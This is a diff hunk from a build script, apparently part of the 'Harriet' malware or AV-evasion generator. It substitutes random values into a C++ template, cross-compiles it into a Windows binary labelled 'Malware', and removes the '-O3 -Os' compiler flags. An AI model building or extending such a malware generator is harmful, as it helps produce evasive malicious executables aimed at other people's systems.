@@ -101,7 +101,7 @@ sed -i "s/Random9/$Random9/g" Harriet/NativeAPI/Resources/template.cpp
 
 
 echo -e ${yellow}"+++Compiling Malware+++"${clear}
-x86_64-w64-mingw32-g++ -o $MALWARE Harriet/NativeAPI/Resources/template.cpp -fpermissive -Wno-narrowing -O2 -O3 -Os>/dev/null 2>&1
+x86_64-w64-mingw32-g++ -o $MALWARE Harriet/NativeAPI/Resources/template.cpp -fpermissive -Wno-narrowing -O2>/dev/null 2>&1
 echo ""
 sleep 2
 rm shell*
